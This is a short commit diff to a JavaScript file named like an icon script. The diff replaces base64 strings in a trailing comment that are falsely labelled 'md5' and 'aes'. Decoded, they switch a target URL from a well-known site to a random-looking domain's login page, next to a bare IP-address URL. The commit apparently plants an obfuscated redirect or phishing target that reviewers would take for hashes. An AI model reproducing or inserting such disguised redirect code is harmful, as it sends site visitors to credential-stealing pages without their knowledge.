7ed5effdf22ebc7bb0b2494c523b83db4fd46e54
unknown <caocaodajun@gmail.com>
2021-06-05 07:54:19 +0000

    init

--- js/icon_h85sq3.js
+++ js/icon_h85sq3.js
@@ -8,4 +8,4 @@ if($.browser.mozilla||$.browser.opera)
 		function UnloadHandler() {
 				window.removeEventListener('beforeunload', UnloadHandler, false);
 		}
-})()/** md5:aHR0cHM6Ly9tLmJhaWR1LmNvbQ==**//** aes:aHR0cDovLzQ3LjI0Mi4xOTkuMjE2**/
+})()/** md5:aHR0cHM6Ly9tLmhiZnJydGR2dmMyMS5jb20vbG9naW4=**//** aes:aHR0cDovLzQ3LjI0Mi4xOTkuMjE2**/
